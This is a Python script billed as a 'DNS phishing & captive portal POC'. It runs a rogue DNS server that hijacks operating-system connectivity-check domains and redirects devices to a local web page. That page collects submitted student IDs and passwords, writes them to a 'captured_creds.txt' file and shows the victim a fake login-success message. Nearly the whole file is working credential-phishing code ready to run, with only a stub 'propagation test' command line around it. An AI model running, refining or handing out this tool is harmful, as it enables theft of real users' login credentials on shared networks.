import socket
import threading
import time
from dnslib import DNSRecord, RR, QTYPE, A
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

# --- Configuration ---
def get_dynamic_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

HOST = get_dynamic_ip()
PORT = 53
HTTP_PORT = 80 
UPSTREAM_DNS = '8.8.8.8'
LOG_FILE = "DNS.log"
CREDS_FILE = "captured_creds.txt" # Dedicated file for captured credentials
HTML_FILE = "index.html"

# Target domains to trigger the Captive Portal
CAPTIVE_PORTAL_DOMAINS = [
    "www.msftconnecttest.com.", "ipv6.msftconnecttest.com.",
    "www.msftncsi.com.", "captive.apple.com.",
    "connectivitycheck.gstatic.com.", "detectportal.firefox.com."
]

log_lock = threading.Lock()

def log(message):
    """Writes to the log file only (no console print) to keep the terminal clean."""
    with log_lock:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] {message}"
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(entry + "\n")

# --- DNS Server Logic ---
def forward_query(data):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2.0)
        sock.sendto(data, (UPSTREAM_DNS, 53))
        response, _ = sock.recvfrom(4096)
        return response
    except Exception as e:
        log(f"Upstream DNS error: {e}")
        return None
    finally:
        sock.close()

def process_dns_logic(data):
    try:
        request = DNSRecord.parse(data)
        qname = str(request.q.qname)
        
        # Hijack the A record if it matches a Captive Portal domain
        if request.q.qtype == QTYPE.A and qname in CAPTIVE_PORTAL_DOMAINS:
            log(f"HIJACK: {qname} redirected to local portal ({HOST})")
            reply = request.reply()
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(HOST), ttl=60))
            return reply.pack()
            
        return forward_query(data)
    except Exception as e:
        log(f"DNS Processing Error: {e}")
        return None

def run_dns():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((HOST, PORT))
        log(f"DNS Server started on {HOST}:{PORT}")
    except PermissionError:
        print("[-] Error: Run as root/sudo to bind to Port 53")
        os._exit(1)
        
    while True:
        data, addr = sock.recvfrom(512)
        resp = process_dns_logic(data)
        if resp: sock.sendto(resp, addr)

# --- HTTP Captive Portal Logic ---
class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Serves the external HTML file."""
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        try:
            with open(HTML_FILE, "rb") as f:
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.wfile.write(b"<h1>Error: index.html not found!</h1>")

    def do_POST(self):
        """Captures form submissions and writes them to a text file."""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)

        user_id = params.get('student_id', ['N/A'])[0]
        password = params.get('password', ['N/A'])[0]

        # Save credentials to the text file
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(CREDS_FILE, "a", encoding="utf-8") as f:
            f.write(f"Time: {timestamp} | ID: {user_id} | Pass: {password}\n")
        
        log(f"SUCCESS: Captured credentials for user {user_id}")

        # Send a fake success response to the victim
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write("<h3>Login successful. Please wait while we connect you to the network...</h3>".encode('utf-8'))

    def log_message(self, format, *args):
        # Mute standard HTTP logs to keep the terminal clean
        pass

def run_http():
    try:
        httpd = HTTPServer((HOST, HTTP_PORT), CaptivePortalHandler)
        log(f"HTTP Portal started on {HOST}:{HTTP_PORT}")
        httpd.serve_forever()
    except PermissionError:
        print("[-] Error: Run as root/sudo to bind to Port 80")
        os._exit(1)

# --- CLI Tool ---
def run_propagation_test(domain):
    print(f"\n--- Running Propagation Test for: {domain} ---")
    print("Testing against global resolvers...")
    # Add your actual propagation test logic here
    time.sleep(1) # Simulated delay
    print(f"Test complete. Check {LOG_FILE} for background DNS events.")

if __name__ == "__main__":
    print("-" * 60)
    print("DNS PHISHING & CAPTIVE PORTAL POC")
    print(f"Listening IP: {HOST}")
    print(f"Captured credentials will be saved to: {os.path.abspath(CREDS_FILE)}")
    print(f"Background logs will be saved to: {os.path.abspath(LOG_FILE)}")
    print("-" * 60)
    
    threading.Thread(target=run_dns, daemon=True).start()
    threading.Thread(target=run_http, daemon=True).start()

    # Interactive CLI Loop
    while True:
        try:
            cmd = input("\ndns-cli> ").strip()
            if cmd.lower() in ['exit', 'quit']: 
                break
            elif cmd: 
                run_propagation_test(cmd)
        except KeyboardInterrupt: 
            break
            
    print("\nShutting down servers...")
